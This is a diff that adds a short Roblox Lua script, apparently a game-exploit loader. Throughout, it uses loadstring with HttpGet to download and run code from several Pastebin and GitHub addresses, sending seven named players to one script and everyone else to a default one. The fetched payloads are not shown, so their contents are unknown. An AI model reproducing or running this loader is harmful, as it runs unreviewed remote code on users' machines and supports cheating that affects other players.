@@ -1,0 +1,25 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/BPxxi6DX"))()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerName = LocalPlayer.Name
+
+local PlayerScripts = {
+    ["IgorLord228"] = "https://pastebin.com/raw/ytxP54RV",
+    ["Rukis074"] = "https://pastebin.com/raw/ytxP54RV",
+    ["kaizennn562"] = "https://pastebin.com/raw/ytxP54RV",
+    ["alexgulibro"] = "https://pastebin.com/raw/ytxP54RV",
+    ["c00l_kidd616"] = "https://pastebin.com/raw/ytxP54RV",
+    ["lavvie_099"] = "https://pastebin.com/raw/ytxP54RV",
+    ["gonzalosanjudas"] = "https://pastebin.com/raw/ytxP54RV",
+}
+
+local DefaultScript = "https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/V2/Script"
+
+local ScriptURL = PlayerScripts[PlayerName] or DefaultScript
+
+loadstring(game:HttpGet(ScriptURL))()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/1Qlua-RBXscript/1qlua/refs/heads/main/Roblox'))()
+
+loadstring(game:HttpGet('https://pastebin.com/raw/6MRGQLXu'))()
